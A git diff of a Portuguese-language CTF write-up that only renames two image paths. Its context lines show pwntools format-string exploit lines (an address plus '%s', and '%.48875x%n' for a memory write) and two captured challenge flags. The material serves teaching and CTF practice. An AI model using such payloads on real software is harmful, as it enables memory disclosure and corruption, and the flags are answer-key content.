@@ -31,7 +31,7 @@ p.sendline(b"\x60\xC0\x04\x08%s")
 p.interactive()
 ```
 
-![CTF 3 A](../img/ctf3task1.png)
+![CTF 3 A](../Images/ctf3task1.png)
 
 Ao executar conseguimos ter acesso ao conteúdo do ficheiro `flag.txt` e à flag do desafio, `flag{07147311b8387a60fea61e241035bf04}`.
 
@@ -54,6 +54,6 @@ p.sendline(b"\x34\xC0\x04\x08%.48875x%n")
 p.interactive()
 ```
 
-![CTF 3 B](../img/ctf3task2.png)
+![CTF 3 B](../Images/ctf3task2.png)
 
 Ao executar conseguimos ter acesso ao conteúdo do ficheiro `flag.txt` e à flag do desafio, `flag{67900caf37372586bef79f7dc99581fd}`.
